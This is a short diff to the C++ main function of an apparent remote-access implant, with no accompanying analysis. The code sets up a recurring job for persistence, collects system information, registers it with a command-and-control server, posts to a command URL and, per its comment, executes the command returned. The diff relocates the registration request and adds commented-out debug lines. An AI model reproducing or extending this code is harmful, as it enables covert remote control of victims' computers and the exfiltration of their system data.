@@ -26,15 +26,28 @@ int main() {
         install.InitRecurringJob();
 
         // Create POST form from DataList and register C2 server
+        // std::ofstream ofs("post_form.txt", std::ofstream::out);
+        // ofs << auth.GetHash();
+        // ofs.close();
         sysinfo::DataList sysinfo(auth.GetHash());
         std::string data = sysinfo.GetPostData();
-        request::Post(register_url, data);
+        
     } else {
         auth.Retrieve();
 
         // Create POST form from DataList and get command from C2 server
+        // std::ofstream ofs("post_form2.txt", std::ofstream::out);
+        // ofs << auth.GetHash();
+        // ofs.close();
+
+        // std::ifstream t("log.txt");
+        // std::stringstream buffer;
+        // buffer << t.rdbuf();
+
         sysinfo::DataList sysinfo(auth.GetHash());
         std::string data = sysinfo.GetPostData();
+        request::Post(register_url, data);
+        
         std::string cmd_response = request::Post(command_url, data);
 
         // Parse JSON response from C2 server and execute command
